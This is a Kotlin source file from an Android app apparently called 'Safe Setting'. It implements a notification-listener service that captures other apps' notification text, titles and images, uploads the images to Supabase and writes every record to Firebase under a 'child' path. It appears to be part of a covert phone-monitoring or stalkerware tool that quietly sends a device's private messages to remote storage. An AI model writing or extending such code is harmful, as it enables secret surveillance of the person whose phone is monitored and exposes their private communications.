package com.safe.setting.app.services.notificationService

import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.safe.setting.app.data.model.NotificationMessages
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.ConstFun.getDateTime
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.NOTIFICATION_MESSAGE
import com.safe.setting.app.utils.FileHelper
import com.safe.setting.app.utils.FileHelper.getFileNameBitmap
import com.safe.setting.app.utils.supabase.SupabaseManager
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import javax.inject.Inject

class InteractorNotificationService @Inject constructor(@ApplicationContext private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {

    private var disposable: CompositeDisposable = CompositeDisposable()

    override fun setRunService(run: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$CHILD_PERMISSION").setValue(run)
    }

    override fun getNotificationExists(id: String, exec: () -> Unit) {
        if (firebase.getUser()!=null) {
            disposable.add(firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id)
                .map { value -> value.exists() }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ if (!it) exec() },{ Log.e(Consts.TAG,it.message.toString()) }))
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun setDataMessageNotification(type: Int, text: String?, title: String?, nameImage: String?, image:Bitmap?) {
        if (image!=null && nameImage != null){
            val imageFilePath = image.getFileNameBitmap(context,nameImage)
            val imageFile = File(imageFilePath)

            // ===============================================================
            // बदला हुआ कोड
            // लॉजिक: CloudinaryManager को SupabaseManager से बदल दिया गया है।
            // अब नोटिफिकेशन की इमेज भी Supabase पर अपलोड होगी।
            // ===============================================================
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val url = SupabaseManager.uploadFile(imageFile)
                    // कोरूटीन से मेन थ्रेड पर स्विच करने की आवश्यकता नहीं है क्योंकि setData फायरबेस में लिखता है
                    // जो पहले से ही बैकग्राउंड थ्रेड को हैंडल करता है।
                    setData(type, text, title, nameImage, url)
                } catch (e: Exception) {
                    Log.e(Consts.TAG, "Supabase Upload Error: ${e.message}")
                    // विफल होने पर भी हम डेटा सहेजते हैं, लेकिन बिना URL के।
                    setData(type, text, title, nameImage, null)
                } finally {
                    FileHelper.deleteFile(imageFilePath)
                }
            }

        } else {
            setData(type,text,title,"-",null)
        }
    }

    private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
        val message = NotificationMessages(text,title,type,getDateTime(),nameImage,urlImage)
        firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$DATA").push().setValue(message)
    }
}
